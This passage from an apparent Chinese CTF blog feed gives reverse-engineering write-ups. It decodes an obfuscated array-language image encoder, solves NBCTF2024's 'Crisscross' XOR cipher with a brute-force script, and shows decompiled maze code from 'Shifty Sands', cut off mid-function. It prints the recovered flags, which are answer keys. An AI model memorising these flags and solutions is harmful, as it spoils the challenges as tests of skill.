<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Flag ← &quot;nbctf&#123;redacted&#125;&quot;</span><br><span class="line">Flag ← utf Flag</span><br><span class="line">÷ⁿ:⌈η;⍢(⌊÷⁅ⁿ⌈ηπ:+◿⁅ⁿ⌈ηπ,:)(≠-×⁅ηπτ):-×⁅ηπτ⋅∘⍥(+,:)⋅∘⍥(+,:)⌊τ..⌊η-×⁅ηπτ;⍢(: ↯:⍉:↯⌊η:↯⊟.⌈√,:⧻. ☇-×⁅ηπτ↻×⁅π,◫+⁅-⌊ητ,↻-⁅π,◿ⁿ:⌈η;⍢(⌊÷⁅ⁿ⌈ηπ:+◿⁅ⁿ⌈ηπ,:)(≠-×⁅ηπτ):-×⁅ηπτ⋅∘⍥(+,:)⋅∘⍥(+,:)⌊τ..⌊η-×⁅ηπτ-:ⁿ:⌈η;⍢(⌊÷⁅ⁿ⌈ηπ:+◿⁅ⁿ⌈ηπ,:)(≠-×⁅ηπτ):-×⁅ηπτ⋅∘⍥(+,:)⋅∘⍥(+,:)⌊τ..⌊η-×⁅ηπτ:-⌊η)(&gt;-×⁅ηπτ)⁅ₙ⋅∘⍥(+,:)⌈π.⌊η×η⧻.Flag</span><br><span class="line">↯ 300_300_3</span><br><span class="line">⧻ Flag</span><br><span class="line"># 49</span><br></pre></td></tr></table></figure>

<p>具体含义如下(根据官网自带的编译器以及符号含义得出 其实看着非常复杂的代码有很大一部分是混淆 即用代数运算结果来代替一些数值):</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">⍢(</span><br><span class="line">  :-1</span><br><span class="line">  :-×⁅ηπτ⋅∘⍥(+,:)⋅∘⍥(+,:)⌊τ..⌊η-×⁅ηπτ</span><br><span class="line">  ⍢(⌊÷⁅ⁿ⌈ηπ:+◿⁅ⁿ⌈ηπ,:)(≠-×⁅ηπτ)</span><br><span class="line">  :-×⁅ηπτ⋅∘⍥(+,:)⋅∘⍥(+,:)⌊τ..⌊η-×⁅ηπτ-:ⁿ:⌈η◌ # 256 - Flag</span><br><span class="line">  ⍢(⌊÷⁅ⁿ⌈ηπ:+◿⁅ⁿ⌈ηπ,:)(≠-×⁅ηπτ)</span><br><span class="line">  ↻-⁅π,◿ⁿ:⌈η◌ # 右移3 - n行 n = (2, 1, 0)</span><br><span class="line">  ◫+⁅-⌊ητ,    # 构造窗口 列数为7 - n</span><br><span class="line">  -×⁅ηπτ↻×⁅π, # 上移 3n 行</span><br><span class="line">  ☇           # 铺平为1维</span><br><span class="line">  ⊟.⌈√,:⧻.    # 长度入栈交换和矩阵的位置 压入shape = [., ceil(√len)]</span><br><span class="line">  :↯          # 改变矩阵形状为shape 取尽后未填满从头再取</span><br><span class="line">  :↯⌊η</span><br><span class="line">  :⍉ # 矩阵转置</span><br><span class="line">  :↯ # 取原来的矩阵大小摊平为1维</span><br><span class="line">)(&gt;0)</span><br><span class="line">:-×⁅ηπτ⋅∘⍥(+,:)⋅∘⍥(+,:)⌊τ..⌊η-×⁅ηπτ</span><br><span class="line">⍢(</span><br><span class="line">  ⌊÷⁅ⁿ⌈ηπ:+◿⁅ⁿ⌈ηπ,:</span><br><span class="line">)(≠-×⁅ηπτ)</span><br><span class="line">÷ⁿ:⌈η◌</span><br><span class="line">↯ 300_300_3</span><br></pre></td></tr></table></figure>

<p>根据以上的分析 题目的古神语并没有对Flag进行任何特殊加密 只是单纯的将256与每个值相减然后进过一系列矩阵变化打乱顺序再构成RGB三通道来生成图片 同时最后输出了Flag的实际长度49</p>
<p>那么我们可以先处理一段长49 且处理完后的值为[0~48]的顺序列表来当作下标标记处理后的值本来应该存放在flag的什么位置:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[256 255 254 253 252 251 250 249 248 247 246 245 244 243 242 241 240 239 238 237 236 235 234 233 232 231 230 229 228 227 226 225 224 223 222 221 220 219 218 217 216 215 214 213 212 211 210 209 208]</span><br><span class="line">3</span><br><span class="line">⍢(</span><br><span class="line">  :-1</span><br><span class="line">  :-×⁅ηπτ⋅∘⍥(+,:)⋅∘⍥(+,:)⌊τ..⌊η-×⁅ηπτ</span><br><span class="line">  ⍢(⌊÷⁅ⁿ⌈ηπ:+◿⁅ⁿ⌈ηπ,:)(≠-×⁅ηπτ)</span><br><span class="line">  :-×⁅ηπτ⋅∘⍥(+,:)⋅∘⍥(+,:)⌊τ..⌊η-×⁅ηπτ-:ⁿ:⌈η◌ # 256 - Flag</span><br><span class="line">  ⍢(⌊÷⁅ⁿ⌈ηπ:+◿⁅ⁿ⌈ηπ,:)(≠-×⁅ηπτ)</span><br><span class="line">  ↻-⁅π,◿ⁿ:⌈η◌ # 右移3 - n行 n = (2, 1, 0)</span><br><span class="line">  ◫+⁅-⌊ητ,    # 构造窗口 列数为7 - n</span><br><span class="line">  -×⁅ηπτ↻×⁅π, # 上移 3n 行</span><br><span class="line">  ☇           # 铺平为1维</span><br><span class="line">  ⊟.⌈√,:⧻.    # 长度入栈交换和矩阵的位置 压入shape = [., ceil(√len)]</span><br><span class="line">  :↯          # 改变矩阵形状为shape 取尽后未填满从头再取</span><br><span class="line">  :↯⌊η</span><br><span class="line">  :⍉ # 矩阵转置</span><br><span class="line">  :↯ # 取原来的矩阵大小摊平为1维</span><br><span class="line">)(&gt;0)</span><br><span class="line">:-×⁅ηπτ⋅∘⍥(+,:)⋅∘⍥(+,:)⌊τ..⌊η-×⁅ηπτ</span><br><span class="line">⍢(</span><br><span class="line">  ⌊÷⁅ⁿ⌈ηπ:+◿⁅ⁿ⌈ηπ,:</span><br><span class="line">)(≠-×⁅ηπτ)</span><br><span class="line">÷ⁿ:⌈η◌</span><br><span class="line">↯ 300_300_3</span><br><span class="line">☇ 0 . # 转化回原来1维方便处理</span><br></pre></td></tr></table></figure>

<p>结果太长不展示</p>
<p>然后利用题目给的图片解密:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line"># key = []</span><br><span class="line"># for i in range(49):</span><br><span class="line">#     key.append(256 - i)</span><br><span class="line"># print(str(key).replace(&quot;, &quot;, &quot; &quot; ))</span><br><span class="line"></span><br><span class="line">ind = [...]</span><br><span class="line">ind = [ind[3 * i:3 * i + 3] for i in range(len(ind) // 3)]</span><br><span class="line">flag = np.array(Image.open(&quot;flag.png&quot;))</span><br><span class="line">weiht, height = flag.shape[0], flag.shape[1]</span><br><span class="line">F = [257] * 49</span><br><span class="line">for i in range(weiht):</span><br><span class="line">    for j in range(height):</span><br><span class="line">        for k in range(3):</span><br><span class="line">            F[ind[300 * i + j][k]] = flag[i][j][k]</span><br><span class="line">            if 257 not in F:</span><br><span class="line">                F = [chr(255 - i) for i in F]</span><br><span class="line">                print(&quot;&quot;.join(F))</span><br><span class="line">                exit(0)</span><br><span class="line"># nbctf&#123;TBH_1_h4t3d_m4kin6_7h1s_ch4ll_6d1a32fe482b&#125;</span><br></pre></td></tr></table></figure>

<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>这几天的古神语研究真的让我产生了一种”这是一种非常安全且功能强大的语言 如果能在某些语言中内联安全性一定很高”的感觉 而且官方目前依然保持高频率更新 只能说希望以后真的能实现古神语保护吧</p>
]]></content>
      <categories>
        <category>杂项</category>
      </categories>
      <tags>
        <tag>栈机</tag>
        <tag>虚拟机</tag>
      </tags>
  </entry>
  <entry>
    <title>NBCTF2024逆向方向wp</title>
    <url>/2024/02/23/NBCTF2024%E9%80%86%E5%90%91%E6%96%B9%E5%90%91wp/</url>
    <content><![CDATA[<p>参赛ID:1K0CT</p>
<p>email: <a href="mailto:&#x6f;&#x6b;&#117;&#117;&#x73;&#x75;&#107;&#117;&#64;&#x67;&#x6d;&#97;&#x69;&#x6c;&#46;&#99;&#x6f;&#109;">&#x6f;&#x6b;&#117;&#117;&#x73;&#x75;&#107;&#117;&#64;&#x67;&#x6d;&#97;&#x69;&#x6c;&#46;&#99;&#x6f;&#109;</a></p>
<span id="more"></span>

<h2 id="Crisscross-pyre"><a href="#Crisscross-pyre" class="headerlink" title="Crisscross | pyre"></a>Crisscross | pyre</h2><p>给了一个python程序和它的输出:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">key1 = random.choices(<span class="built_in">range</span>(<span class="number">256</span>), k=<span class="number">20</span>)</span><br><span class="line">key2 = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">random.shuffle(key2)</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">n</span>):</span><br><span class="line">    q = key2[n]</span><br><span class="line">    w = key1[q % <span class="number">20</span>]</span><br><span class="line">    n ^= q</span><br><span class="line">    <span class="keyword">return</span> n, w</span><br><span class="line"></span><br><span class="line">x = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(flag):</span><br><span class="line">    x &lt;&lt;= <span class="number">8</span></span><br><span class="line">    n, w = enc(c)</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span>:</span><br><span class="line">        n, w = w, n</span><br><span class="line">    x |= n</span><br><span class="line">    x |= w &lt;&lt; ((<span class="number">2</span> * i + <span class="number">1</span>) * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(key1)</span><br><span class="line"><span class="built_in">print</span>(key2)</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line"><span class="comment">#[127, 81, 241, 40, 222, 128, 45, 87, 27, 154, 66, 162, 73, 176, 172, 164, 106, 234, 77, 5]</span></span><br><span class="line"><span class="comment">#[155, 117, 124, 113, 104, 46, 151, 71, 144, 229, 152, 240, 199, 88, 103, 105, 245, 209, 13, 82, 166, 9, 201, 233, 228, 154, 19, 5, 30, 141, 81, 206, 246, 232, 107, 29, 208, 253, 187, 116, 98, 160, 60, 7, 220, 143, 80, 239, 52, 15, 94, 50, 149, 241, 57, 92, 230, 100, 31, 51, 36, 24, 39, 14, 25, 90, 101, 55, 194, 225, 157, 102, 2, 26, 148, 161, 180, 120, 223, 165, 32, 146, 185, 243, 119, 210, 172, 244, 1, 125, 44, 35, 169, 179, 188, 64, 207, 33, 137, 200, 142, 182, 250, 195, 28, 4, 79, 191, 86, 215, 96, 236, 91, 122, 196, 87, 118, 231, 126, 97, 147, 67, 132, 190, 234, 237, 43, 193, 252, 18, 212, 163, 56, 73, 123, 176, 162, 23, 192, 49, 21, 242, 171, 112, 153, 238, 203, 134, 167, 93, 115, 95, 8, 12, 65, 217, 248, 168, 219, 47, 211, 108, 76, 129, 145, 62, 156, 34, 218, 135, 48, 70, 75, 3, 249, 72, 202, 133, 183, 38, 37, 227, 164, 173, 159, 251, 0, 174, 54, 20, 136, 53, 138, 99, 226, 178, 42, 66, 150, 205, 204, 214, 197, 235, 110, 216, 63, 45, 184, 74, 41, 177, 27, 69, 130, 89, 61, 247, 255, 17, 254, 181, 131, 22, 224, 83, 189, 59, 114, 139, 111, 68, 6, 84, 11, 127, 221, 106, 77, 109, 158, 170, 16, 121, 222, 186, 10, 58, 175, 40, 128, 198, 78, 85, 213, 140]</span></span><br><span class="line"><span class="comment">#3449711664888782790334923396354433085218951813669043815144799745483347584183883892868078716490762334737115401929391994359609927294549975954045314661787321463018287415952</span></span><br></pre></td></tr></table></figure>

<p>求出flag每一位对应的<code>(w, n)</code>(需要注意的是<code>w</code>和<code>n</code>的排列顺序类似<code>...n[2], w[1], n[0], w[0], n[1], w[1]...</code>) 再稍微改一下原程序爆破出flag:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key1 = [<span class="number">127</span>, <span class="number">81</span>, <span class="number">241</span>, <span class="number">40</span>, <span class="number">222</span>, <span class="number">128</span>, <span class="number">45</span>, <span class="number">87</span>, <span class="number">27</span>, <span class="number">154</span>, <span class="number">66</span>, <span class="number">162</span>, <span class="number">73</span>, <span class="number">176</span>, <span class="number">172</span>, <span class="number">164</span>, <span class="number">106</span>, <span class="number">234</span>, <span class="number">77</span>, <span class="number">5</span>]</span><br><span class="line">key2 = [<span class="number">155</span>, <span class="number">117</span>, <span class="number">124</span>, <span class="number">113</span>, <span class="number">104</span>, <span class="number">46</span>, <span class="number">151</span>, <span class="number">71</span>, <span class="number">144</span>, <span class="number">229</span>, <span class="number">152</span>, <span class="number">240</span>, <span class="number">199</span>, <span class="number">88</span>, <span class="number">103</span>, <span class="number">105</span>, <span class="number">245</span>, <span class="number">209</span>, <span class="number">13</span>, <span class="number">82</span>, <span class="number">166</span>, <span class="number">9</span>, <span class="number">201</span>, <span class="number">233</span>, <span class="number">228</span>, <span class="number">154</span>, <span class="number">19</span>, <span class="number">5</span>, <span class="number">30</span>, <span class="number">141</span>, <span class="number">81</span>, <span class="number">206</span>, <span class="number">246</span>, <span class="number">232</span>, <span class="number">107</span>, <span class="number">29</span>, <span class="number">208</span>, <span class="number">253</span>, <span class="number">187</span>, <span class="number">116</span>, <span class="number">98</span>, <span class="number">160</span>, <span class="number">60</span>, <span class="number">7</span>, <span class="number">220</span>, <span class="number">143</span>, <span class="number">80</span>, <span class="number">239</span>, <span class="number">52</span>, <span class="number">15</span>, <span class="number">94</span>, <span class="number">50</span>, <span class="number">149</span>, <span class="number">241</span>, <span class="number">57</span>, <span class="number">92</span>, <span class="number">230</span>, <span class="number">100</span>, <span class="number">31</span>, <span class="number">51</span>, <span class="number">36</span>, <span class="number">24</span>, <span class="number">39</span>, <span class="number">14</span>, <span class="number">25</span>, <span class="number">90</span>, <span class="number">101</span>, <span class="number">55</span>, <span class="number">194</span>, <span class="number">225</span>, <span class="number">157</span>, <span class="number">102</span>, <span class="number">2</span>, <span class="number">26</span>, <span class="number">148</span>, <span class="number">161</span>, <span class="number">180</span>, <span class="number">120</span>, <span class="number">223</span>, <span class="number">165</span>, <span class="number">32</span>, <span class="number">146</span>, <span class="number">185</span>, <span class="number">243</span>, <span class="number">119</span>, <span class="number">210</span>, <span class="number">172</span>, <span class="number">244</span>, <span class="number">1</span>, <span class="number">125</span>, <span class="number">44</span>, <span class="number">35</span>, <span class="number">169</span>, <span class="number">179</span>, <span class="number">188</span>, <span class="number">64</span>, <span class="number">207</span>, <span class="number">33</span>, <span class="number">137</span>, <span class="number">200</span>, <span class="number">142</span>, <span class="number">182</span>, <span class="number">250</span>, <span class="number">195</span>, <span class="number">28</span>, <span class="number">4</span>, <span class="number">79</span>, <span class="number">191</span>, <span class="number">86</span>, <span class="number">215</span>, <span class="number">96</span>, <span class="number">236</span>, <span class="number">91</span>, <span class="number">122</span>, <span class="number">196</span>, <span class="number">87</span>, <span class="number">118</span>, <span class="number">231</span>, <span class="number">126</span>, <span class="number">97</span>, <span class="number">147</span>, <span class="number">67</span>, <span class="number">132</span>, <span class="number">190</span>, <span class="number">234</span>, <span class="number">237</span>, <span class="number">43</span>, <span class="number">193</span>, <span class="number">252</span>, <span class="number">18</span>, <span class="number">212</span>, <span class="number">163</span>, <span class="number">56</span>, <span class="number">73</span>, <span class="number">123</span>, <span class="number">176</span>, <span class="number">162</span>, <span class="number">23</span>, <span class="number">192</span>, <span class="number">49</span>, <span class="number">21</span>, <span class="number">242</span>, <span class="number">171</span>, <span class="number">112</span>, <span class="number">153</span>, <span class="number">238</span>, <span class="number">203</span>, <span class="number">134</span>, <span class="number">167</span>, <span class="number">93</span>, <span class="number">115</span>, <span class="number">95</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">65</span>, <span class="number">217</span>, <span class="number">248</span>, <span class="number">168</span>, <span class="number">219</span>, <span class="number">47</span>, <span class="number">211</span>, <span class="number">108</span>, <span class="number">76</span>, <span class="number">129</span>, <span class="number">145</span>, <span class="number">62</span>, <span class="number">156</span>, <span class="number">34</span>, <span class="number">218</span>, <span class="number">135</span>, <span class="number">48</span>, <span class="number">70</span>, <span class="number">75</span>, <span class="number">3</span>, <span class="number">249</span>, <span class="number">72</span>, <span class="number">202</span>, <span class="number">133</span>, <span class="number">183</span>, <span class="number">38</span>, <span class="number">37</span>, <span class="number">227</span>, <span class="number">164</span>, <span class="number">173</span>, <span class="number">159</span>, <span class="number">251</span>, <span class="number">0</span>, <span class="number">174</span>, <span class="number">54</span>, <span class="number">20</span>, <span class="number">136</span>, <span class="number">53</span>, <span class="number">138</span>, <span class="number">99</span>, <span class="number">226</span>, <span class="number">178</span>, <span class="number">42</span>, <span class="number">66</span>, <span class="number">150</span>, <span class="number">205</span>, <span class="number">204</span>, <span class="number">214</span>, <span class="number">197</span>, <span class="number">235</span>, <span class="number">110</span>, <span class="number">216</span>, <span class="number">63</span>, <span class="number">45</span>, <span class="number">184</span>, <span class="number">74</span>, <span class="number">41</span>, <span class="number">177</span>, <span class="number">27</span>, <span class="number">69</span>, <span class="number">130</span>, <span class="number">89</span>, <span class="number">61</span>, <span class="number">247</span>, <span class="number">255</span>, <span class="number">17</span>, <span class="number">254</span>, <span class="number">181</span>, <span class="number">131</span>, <span class="number">22</span>, <span class="number">224</span>, <span class="number">83</span>, <span class="number">189</span>, <span class="number">59</span>, <span class="number">114</span>, <span class="number">139</span>, <span class="number">111</span>, <span class="number">68</span>, <span class="number">6</span>, <span class="number">84</span>, <span class="number">11</span>, <span class="number">127</span>, <span class="number">221</span>, <span class="number">106</span>, <span class="number">77</span>, <span class="number">109</span>, <span class="number">158</span>, <span class="number">170</span>, <span class="number">16</span>, <span class="number">121</span>, <span class="number">222</span>, <span class="number">186</span>, <span class="number">10</span>, <span class="number">58</span>, <span class="number">175</span>, <span class="number">40</span>, <span class="number">128</span>, <span class="number">198</span>, <span class="number">78</span>, <span class="number">85</span>, <span class="number">213</span>, <span class="number">140</span>]</span><br><span class="line">x = <span class="number">3449711664888782790334923396354433085218951813669043815144799745483347584183883892868078716490762334737115401929391994359609927294549975954045314661787321463018287415952</span></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">while</span>(x):</span><br><span class="line">    flag.append(x &amp; <span class="number">0xFF</span>)</span><br><span class="line">    x &gt;&gt;= <span class="number">8</span></span><br><span class="line">w_o = []</span><br><span class="line">n_o = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">35</span>):</span><br><span class="line">    n_o.append(flag[<span class="number">35</span> + (-<span class="number">1</span> <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">2</span>) <span class="keyword">else</span> <span class="number">1</span>) * ((<span class="number">2</span> * <span class="built_in">int</span>(i / <span class="number">2</span>) + <span class="number">1</span>))])</span><br><span class="line">    w_o.append(flag[<span class="number">35</span> + (-<span class="number">1</span> <span class="keyword">if</span> (i % <span class="number">2</span>) <span class="keyword">else</span> <span class="number">1</span>) * <span class="built_in">int</span>((i + <span class="number">1</span>) / <span class="number">2</span>) * <span class="number">2</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">n</span>):</span><br><span class="line">    q = key2[n]</span><br><span class="line">    w = key1[q % <span class="number">20</span>]</span><br><span class="line">    n ^= q</span><br><span class="line">    <span class="keyword">return</span> n, w</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">35</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">125</span>):</span><br><span class="line">        n, w = enc(c)</span><br><span class="line">        <span class="keyword">if</span> n == n_o[i] <span class="keyword">and</span> w == w_o[i]:</span><br><span class="line">            flag += <span class="built_in">chr</span>(c)</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="comment"># nbctf&#123;cr15s_cr0ss_str4wb3rry_s4uz3&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="Shifty-Sands-进阶的迷宫题"><a href="#Shifty-Sands-进阶的迷宫题" class="headerlink" title="Shifty Sands | 进阶的迷宫题"></a><strong>Shifty Sands</strong> | 进阶的迷宫题</h2><p>用DIE打开附件 64位ELF无壳 IDA64打开 主函数结构非常简单 胜利的判断是走到<code>L</code> 失败的判定是走到<code>S</code> 唯一需要费点时间看的是加了点混淆(永真判断)的<code>change()</code>函数:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> input; <span class="comment">// [rsp+Fh] [rbp-11h]</span></span><br><span class="line">  <span class="type">int</span> row; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> col; <span class="comment">// [rsp+14h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  row = <span class="number">0</span>;</span><br><span class="line">  col = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      input = getchar();</span><br><span class="line">    <span class="keyword">while</span> ( input == <span class="number">10</span> );</span><br><span class="line">    change();                                   <span class="comment">// 从1开始算</span></span><br><span class="line">                                                <span class="comment">// 走到4n    步时S向右扩散</span></span><br><span class="line">                                                <span class="comment">// 走到4n + 3步时S向上扩散</span></span><br><span class="line">                                                <span class="comment">// 走到4n + 2步时S向左扩散</span></span><br><span class="line">                                                <span class="comment">// 走到4n + 1步时S向下扩散</span></span><br><span class="line">    ++step;</span><br><span class="line">    check(input, &amp;row, &amp;col);</span><br><span class="line">    <span class="keyword">if</span> ( step &gt; <span class="number">49</span> || maze[<span class="number">10</span> * row + col] == <span class="string">&#x27;S&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;ssssssssss&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( maze[<span class="number">10</span> * row + col] != <span class="string">&#x27;L&#x27;</span> );</span><br><span class="line">  openflag();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// change():</span></span><br><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">change</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> jj; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> ii; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> kk; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> n; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> m; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  result = (step % <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result == <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">9</span>; i &gt;= <span class="number">0</span>; --i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">9</span>; ++j )</span><br><span class="line">      &#123;</span><br><span class="line">        result = maze[<span class="number">10</span> * j + i];</span><br><span class="line">        <span class="keyword">if</span> ( result == <span class="string">&#x27;S&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          result = j;</span><br><span class="line">          <span class="keyword">if</span> ( j &gt;= <span class="number">0</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            result = (i + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> ( (result &amp; <span class="number">0x80000000</span>) == <span class="number">0LL</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              result = (i + <span class="number">1</span>);</span><br><span class="line">              <span class="keyword">if</span> ( result &lt;= <span class="number">9</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                result = maze[<span class="number">10</span> * j + <span class="number">1</span> + i];</span><br><span class="line">                <span class="keyword">if</span> ( result == <span class="string">&#x27;.&#x27;</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  maze[<span class="number">10</span> * j + i] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                  result = &amp;maze[<span class="number">10</span> * j + <span class="number">1</span> + i];</span><br><span class="line">                  *result = <span class="string">&#x27;S&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( result &lt;= <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( result == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">9</span>; ++k )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt;= <span class="number">9</span>; ++m )</span><br><span class="line">        &#123;</span><br><span class="line">          result = maze[<span class="number">10</span> * k + m];</span><br><span class="line">          <span class="keyword">if</span> ( result == <span class="string">&#x27;S&#x27;</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            result = (k - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> ( (result &amp; <span class="number">0x80000000</span>) == <span class="number">0LL</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              result = (k - <span class="number">1</span>);</span><br><span class="line">              <span class="keyword">if</span> ( result &lt;= <span class="number">9</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                result = m;</span><br><span class="line">                <span class="keyword">if</span> ( m &gt;= <span class="number">0</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  result = maze[<span class="number">10</span> * k - <span class="number">10</span> + m];</span><br><span class="line">                  <span class="keyword">if</span> ( result == <span class="string">&#x27;.&#x27;</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    maze[<span class="number">10</span> * k + m] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                    result = &amp;maze[<span class="number">10</span> * k - <span class="number">10</span> + m];</span><br><span class="line">                    *result = <span class="string">&#x27;S&#x27;</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( result )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( result == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">for</span> ( n = <span class="number">0</span>; n &lt;= <span class="number">9</span>; ++n )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">for</span> ( ii = <span class="number">0</span>; ii &lt;= <span class="number">9</span>; ++ii )</span><br><span class="line">          &#123;</span><br><span class="line">            result = maze[<span class="number">10</span> * ii + n];</span><br><span class="line">            <span class="keyword">if</span> ( result == <span class="string">&#x27;S&#x27;</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              result = ii;</span><br><span class="line">              <span class="keyword">if</span> ( ii &gt;= <span class="number">0</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                result = (n - <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">if</span> ( (result &amp; <span class="number">0x80000000</span>) == <span class="number">0LL</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  result = (n - <span class="number">1</span>);</span><br><span class="line">                  <span class="keyword">if</span> ( result &lt;= <span class="number">9</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    result = maze[<span class="number">10</span> * ii - <span class="number">1</span> + n];</span><br><span class="line">                    <span class="keyword">if</span> ( result == <span class="string">&#x27;.&#x27;</span> )</span><br><span class="line">                    &#123;</span><br><span class="line">                      maze[<span class="number">10</span> * ii + n] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                      result = &amp;maze[<span class="number">10</span> * ii - <span class="number">1</span> + n];</span><br><span class="line">                      *result = <span class="string">&#x27;S&#x27;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              